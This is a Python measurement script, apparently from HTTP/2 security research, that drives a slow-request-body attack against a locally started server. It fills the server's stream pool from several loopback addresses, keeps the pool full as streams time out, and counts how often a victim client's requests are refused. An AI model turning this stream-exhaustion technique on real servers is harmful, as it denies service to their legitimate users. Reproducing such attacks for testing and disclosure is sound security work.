#!/usr/bin/env python3
"""P32 steady-state measurement: fill the H2 stream pool with partial request
bodies, keep it rolling, and probe a fresh victim repeatedly.

Reports the fraction of victim GETs refused with RST_STREAM REFUSED_STREAM
while the holders remain active, plus the largest gap between refusals.
"""
import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import h2bodyhold


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--sources", type=int, default=4)
    ap.add_argument("--connections-per-source", type=int, default=2)
    ap.add_argument("--per-source", type=int, default=32)
    ap.add_argument("--open-interval", type=float, default=0.08)
    ap.add_argument("--fill-seconds", type=int, default=40)
    ap.add_argument("--measure-seconds", type=int, default=60)
    ap.add_argument("--probe-interval", type=float, default=0.25)
    args = ap.parse_args()

    h2bodyhold.setup()
    proc = h2bodyhold.start()
    try:
        print("baseline:", h2bodyhold.victim_probe(), flush=True)
        holders = []
        for i in range(args.sources):
            for _ in range(args.connections_per_source):
                holders.append(h2bodyhold.BodyHolder(f"127.0.0.{i + 2}", args.per_source))
        target = len(holders) * args.per_source
        started = time.time()
        next_open = started
        fill_end = started + args.fill_seconds
        while time.time() < fill_end:
            now = time.time()
            for h in holders:
                h.drain()
            if now >= next_open:
                for h in holders:
                    if len(h.active) < h.limit:
                        h.open_one()
                        break
                next_open += args.open_interval
            time.sleep(0.005)
        active = sum(len(h.active) for h in holders)
        print(f"pool filled: active={active}/{target} "
              f"opened={sum(h.total_opened for h in holders)}", flush=True)

        ok = refused = other = 0
        last_refusal = None
        max_gap = 0.0
        end = time.time() + args.measure_seconds
        while time.time() < end:
            # Keep rolling: replace timed-out streams as they are observed.
            now = time.time()
            for h in holders:
                h.drain()
            while now >= next_open:
                for h in holders:
                    if len(h.active) < h.limit:
                        h.open_one()
                        break
                next_open += args.open_interval
            probe = h2bodyhold.victim_probe()
            if probe.startswith("status=b'200'"):
                ok += 1
                if last_refusal is not None:
                    gap = time.time() - last_refusal
                    max_gap = max(max_gap, gap)
            elif "reset=7" in probe:
                refused += 1
                last_refusal = time.time()
            else:
                other += 1
            time.sleep(args.probe_interval)
        total = ok + refused + other
        print(f"steady state: probes={total} refused={refused} served={ok} "
              f"other={other} refusal_ratio={refused / max(total, 1):.3f} "
              f"max_served_gap={max_gap:.2f}s "
              f"408s={sum(h.total_408 for h in holders)} "
              f"resets={sum(h.total_reset for h in holders)}", flush=True)
        for h in holders:
            h.close()
        time.sleep(1)
        print("after release:", h2bodyhold.victim_probe(), flush=True)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()


if __name__ == "__main__":
    main()
